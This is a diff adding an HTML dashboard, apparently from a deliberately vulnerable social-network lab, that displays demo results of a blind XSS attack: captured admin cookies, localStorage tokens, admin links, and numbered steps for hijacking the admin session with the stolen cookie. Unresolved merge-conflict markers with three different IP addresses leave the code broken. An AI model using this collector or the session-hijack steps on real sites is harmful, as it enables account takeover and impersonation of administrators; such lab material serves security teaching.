@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+    <html>
+    <head>
+        <title>Admin Panel Data Collector</title>
+        <meta charset="utf-8">
+        <style>
+            body {
+                font-family: 'Courier New', monospace;
+                background: #0a0a0a;
+                color: #00ff00;
+                padding: 20px;
+                margin: 0;
+            }
+            .admin-data {
+                background: #1a1a1a;
+                border: 2px solid #00ff00;
+                padding: 20px;
+                margin: 20px 0;
+                border-radius: 5px;
+                box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
+            }
+            h1 {
+                text-align: center;
+                color: #00ff00;
+                text-shadow: 0 0 15px #00ff00;
+                animation: glow 2s ease-in-out infinite alternate;
+            }
+            @keyframes glow {
+                from { text-shadow: 0 0 15px #00ff00; }
+                to { text-shadow: 0 0 25px #00ff00, 0 0 35px #00ff00; }
+            }
+            .data-section {
+                background: #000;
+                padding: 15px;
+                margin: 10px 0;
+                border-left: 3px solid #00ff00;
+                overflow-x: auto;
+            }
+            pre {
+                margin: 0;
+                white-space: pre-wrap;
+                word-break: break-all;
+            }
+            .critical {
+                color: #ff0000;
+                font-weight: bold;
+            }
+            .warning {
+                color: #ffaa00;
+            }
+            .success {
+                color: #00ff00;
+            }
+        </style>
+    </head>
+    <body>
+        <h1>🛡️ Admin Panel Data Collector 🛡️</h1>
+        
+        <div class="admin-data">
+            <h2>Blind XSS Results</h2>
+            <div id="blindXssData">
+                <p class="warning">Waiting for admin to trigger blind XSS payload...</p>
+            </div>
+        </div>
+        
+        <div class="admin-data">
+            <h2>Captured Admin Sessions</h2>
+            <div id="adminSessions">
+                <p>No admin sessions captured yet.</p>
+            </div>
+        </div>
+        
+        <div class="admin-data">
+            <h2>Admin Actions Log</h2>
+            <div id="adminActions">
+                <p>Monitoring admin actions...</p>
+            </div>
+        </div>
+        
+        <script>
+            // 실제로는 서버에서 데이터를 가져와야 함
+            let adminCaptures = [];
+            
+            // 데모 데이터 (실제로는 서버에서 받아옴)
+            setTimeout(() => {
+                const demoData = {
+                    timestamp: new Date().toISOString(),
+                    type: 'BLIND_XSS',
+                    data: {
+                        cookies: 'admin_session=abc123def456; role=administrator; csrf_token=xyz789',
+<<<<<<< HEAD
+                        url: 'http://3.34.181.145/admin/dashboard.php',
+=======
+<<<<<<< HEAD
+                        url: 'http://52.78.221.104/admin/dashboard.php',
+=======
+                        url: 'http://15.164.95.252/admin/dashboard.php',
+>>>>>>> eea88d3d798c92206cd9c59f03a6d571a4b5205c
+>>>>>>> 2e2f028c4c1a6754a5e49eeba50ab8a9beb9c4b1
+                        title: 'Admin Dashboard - Vulnerable SNS',
+                        localStorage: {
+                            'admin_token': 'secret_admin_token_123',
+                            'last_login': '2024-01-15T10:30:00Z'
+                        },
+                        adminLinks: [
+<<<<<<< HEAD
+                            'http://3.34.181.145/admin/users.php',
+                            'http://3.34.181.145/admin/settings.php',
+                            'http://3.34.181.145/admin/logs.php'
+=======
+<<<<<<< HEAD
+                            'http://52.78.221.104/admin/users.php',
+                            'http://52.78.221.104/admin/settings.php',
+                            'http://52.78.221.104/admin/logs.php'
+=======
+                            'http://15.164.95.252/admin/users.php',
+                            'http://15.164.95.252/admin/settings.php',
+                            'http://15.164.95.252/admin/logs.php'
+>>>>>>> eea88d3d798c92206cd9c59f03a6d571a4b5205c
+>>>>>>> 2e2f028c4c1a6754a5e49eeba50ab8a9beb9c4b1
+                        ]
+                    }
+                };
+                
+                displayAdminData(demoData);
+            }, 5000);
+            
+            function displayAdminData(capture) {
+                adminCaptures.push(capture);
+                
+                const blindXssDiv = document.getElementById('blindXssData');
+                blindXssDiv.innerHTML = `
+                    <div class="data-section">
+                        <h3 class="success">✓ Admin Panel Accessed!</h3>
+                        <p><strong>Time:</strong> ${capture.timestamp}</p>
+                        <p><strong>URL:</strong> <span class="critical">${capture.data.url}</span></p>
+                        <p><strong>Page Title:</strong> ${capture.data.title}</p>
+                        
+                        <h4>🍪 Admin Cookies:</h4>
+                        <pre class="critical">${capture.data.cookies}</pre>
+                        
+                        <h4>💾 LocalStorage:</h4>
+                        <pre>${JSON.stringify(capture.data.localStorage, null, 2)}</pre>
+                        
+                        <h4>🔗 Admin Links Found:</h4>
+                        <ul>
+                            ${capture.data.adminLinks.map(link => `<li><a href="${link}" class="warning">${link}</a></li>`).join('')}
+                        </ul>
+                    </div>
+                `;
+                
+                updateAdminSessions(capture.data.cookies);
+            }
+            
+            function updateAdminSessions(cookies) {
+                const sessionsDiv = document.getElementById('adminSessions');
+                const sessionMatch = cookies.match(/admin_session=([^;]+)/);
+                
+                if (sessionMatch) {
+                    sessionsDiv.innerHTML = `
+                        <div class="data-section">
+                            <p class="success">✓ Admin session captured!</p>
+                            <p><strong>Session ID:</strong> <span class="critical">${sessionMatch[1]}</span></p>
+                            <p class="warning">⚠️ This session can be used to impersonate the admin!</p>
+                            
+                            <h4>How to use:</h4>
+                            <ol>
+                                <li>Open browser developer tools (F12)</li>
+                                <li>Go to Application/Storage → Cookies</li>
+                                <li>Add cookie: admin_session = ${sessionMatch[1]}</li>
+                                <li>Refresh the page to access admin panel</li>
+                            </ol>
+                        </div>
+                    `;
+                }
+            }
+            
+            // 주기적으로 서버에서 새 데이터 확인 (실제 구현 시)
+            setInterval(() => {
+                // fetch('/blind-xss-data').then(r => r.json()).then(displayAdminData);
+            }, 5000);
+        </script>
+    </body>
+    </html>
